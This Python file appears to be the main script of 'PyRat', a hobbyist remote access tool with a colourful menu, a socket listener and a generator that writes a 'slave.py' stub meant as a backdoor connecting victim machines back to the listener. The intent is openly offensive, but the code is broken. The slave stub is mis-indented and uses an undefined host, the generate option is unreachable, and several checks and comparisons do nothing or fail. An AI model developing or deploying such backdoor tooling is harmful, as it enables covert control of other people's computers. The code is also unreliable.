import socket
import os
import time
import sys
import colorama
from colorama import Fore
import platform
import requests
import bs4
from bs4 import BeautifulSoup as soup
import json
from github import Github
import base64
from pprint import pprint
user = platform.system()
wi = "\033[1;37m"  # >>White#
rd = "\033[1;31m"  # >Red   #
gr = "\033[1;32m"  # >Green #
yl = "\033[1;33m"  # >Yellow#
port = 8080
host = socket.gethostname()
currentdir = os.getcwd()
def server():
    print(Fore.MAGENTA + 'Listener Has Started Listening...')
    serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    serversocket.bind((host, port))
    print("Server is running currently running at " + wi + gr + host)
    time.sleep(1)
    print("Waiting For any incoming connections...")
    serversocket.listen(1)
    conn, addr = serversocket.accept()
    print(addr, + Fore.CYAN + " Has successfully connected to the server!")
def choice():
    sure = ['y','n']
    choice = input("Are You Sure? y/n: ")
    if choice == sure[0]:
        time.sleep(1)
        print(Fore.YELLOW + "(っ◔◡◔)っ ♥ Quitting.... ♥")
        sys.exit()
    else:
        print(Fore.RED + 'Cancelled.')
def slave():
  file = open('slave.py','w')
  file.write('''
  import os
  import socket
  port = 8080
  s = socket.socket()
  connect = s.connect((host,port))
  ''')
def update():
 print(Fore.MAGENTA +  'Getting Update info...')
 user = 'FonderElite'
 repo = 'PyRat'
 user_data = requests.get(f'https://api.github.com/users/{user}/repos/commits').json()
 time.sleep(2)
 if update == '{ "message": "Not Found", "documentation_url": "https://docs.github.com/rest"}':
     print(Fore.RED + "Error, Please refer to my official Github Repo: https://github.com/fonderelite/PyRat ")
 else:
  print( Fore.RED + "Error, Please refer to my official Github Repo: https://github.com/fonderelite/PyRat")
try:
    os.path.exists('server.py')
except FileNotFoundError:
    print(Fore.RED + "server.py is not in the Current Directory!")
    print(" [*] Please git clone the Directory again in my Github Page")
    sys.exit(1)
try:
    os.path.exists('slave.py')
except FileNotFoundError:
    print(Fore.RED + "slave.py is not in the Current Directory!")
    print(" [*] Please git clone the Directory again in my Github Page.")
    sys.exit(1)
try:
    import socket
except ImportError:
    print(Fore.RED + "socket module imported!")
    print(" [*] Please Use pip install socket to fix this issue.")
    sys.exit(1)
    sys.stdout.write(Fore.MAGENTA + '''\r                 
╔═╗  ╦ ╦  ╦═╗  ╔═╗  ╔╦╗
╠═╝  ╚╦╝  ╠╦╝  ╠═╣   ║ 
╩     ╩   ╩╚═  ╩ ╩   ╩       
      (q\_/p)
       /. .\        Remote Access Tool 
      =\_t_/=   __   Using Python
       /   \   (     
      ((   ))   )  
      /\) (/\  /
      \  Y  /-'
       nn^nn          
                    ''')
time.sleep(1)
print(Fore.CYAN + gr +  '''
Made by FonderElite || Droid
Visit My Github Page: https://github.com/Fonderelite
''')
help = Fore.YELLOW + '''
=============================================
+|           PYRAT [PYTHON RAT]             |+
=============================================
+|  M a d e    By    F o n d e r E l i t e |+
+|-----------------------------------------|+
+|      -h          Help                   |+
+|      -s         Start Listener          |+
+|      -g         Generate Slave          |+
+|      -c         Check Files             |+
+|      -u         Update                  |+
+|      -q         Quit                    |+
+|      Ex   ./pyrat -s (Start Listener)   |+
 ==========================================='''
print(Fore.YELLOW + help)
while True:
    command = input(gr + '[+]' + Fore.RED + user + "-User: ")
    if command == './pyrat -h':
      print(help)
    elif command == './pyrat -s':
     print(Fore.CYAN + wi + 'Starting Listener To Listen To Open Connections...')
     time.sleep(2)
     server()
    elif command == './pyrat -q':
        choice()
    elif command == './pyrat -c':
        print("Current Directory:" + currentdir)
        print(Fore.CYAN + 'Checking Files in the Current Directory...')
        time.sleep(3)
        os.path.exists('slave.py')
        os.path.exists('server.py')
        os.path.exists('requirements.txt')
        os.path.exists('install.sh')
        print(Fore.GREEN + 'Done!')
        print(Fore.GREEN + 'Files are safe!')
    elif command == "./pyrat -u":
        update()

    elif command == "./pyrat -s":
       print(Fore.YELLOW + '''Generating Slave...''')
       time.sleep(2)
       slave()
       print('Use this as backdoor to your slave computer be connected to the listener.')

    else:
        print(Fore.RED + '''
 ___  __   __   __    __           
|__  |__) |__) /  \ |__)      
|___ |  \ |  \ \__/ |  \      ''')
        print(Fore.BLUE + '''
           __n__n__
    .------`-/00/-'
   /  ##  ## (oo)   Please Try Again.
  / \## __   ./
     |//YY \|/
     |||   |||   \|/
               ''')
